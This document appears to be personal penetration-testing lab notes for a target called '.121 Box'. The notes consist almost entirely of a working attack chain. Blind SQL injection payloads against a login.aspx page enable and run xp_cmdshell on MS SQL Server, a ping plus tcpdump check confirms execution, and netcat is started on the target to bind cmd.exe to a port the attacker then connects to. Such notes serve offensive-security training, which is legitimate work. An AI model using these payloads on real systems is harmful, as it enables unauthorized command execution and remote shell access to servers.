# .121 Box
- Login page at login.aspx
- Blind sql injection with the following commands 
```
' EXECUTE sp_configure 'show advanced options', 1; --//
```
```
' RECONFIGURE; --//
```
```
' EXECUTE sp_configure 'xp_cmdshell', 1; --//
```
```
' RECONFIGURE; --//
```
```
' EXECUTE xp_cmdshell 'ping 192.168.45.170'; --
```
- Read the traffic to make sure it works with the following command before the ping command 
```
sudo tcpdump -i tun0 icmp
```
- Start a listener with 
```
' EXECUTE xp_cmdshell 'C:\temp\nc.exe -lvp 8888 -e cmd.exe'; --
```
- Connect with 
```
nc <IP> 8888
```